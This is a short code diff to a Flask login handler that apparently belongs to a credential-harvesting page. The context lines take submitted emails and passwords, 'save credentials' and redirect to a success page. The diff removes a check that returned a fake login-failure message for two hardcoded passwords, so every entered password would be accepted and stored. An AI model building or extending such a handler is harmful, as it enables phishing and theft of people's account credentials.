@@ -41,13 +41,7 @@ def login():
     email = data.get('email')
     password = data.get('password')
     
-    # Check for specific passwords
-    if password in ['srmmph@2025', 'mphtiss@2025']:
-        return jsonify({
-            'status': 'error',
-            'message': 'Login failed. Please check your credentials and try again.'
-        }), 401
-    
+
     # Save credentials and redirect to success page
     try:
         # Create timestamp with milliseconds precision
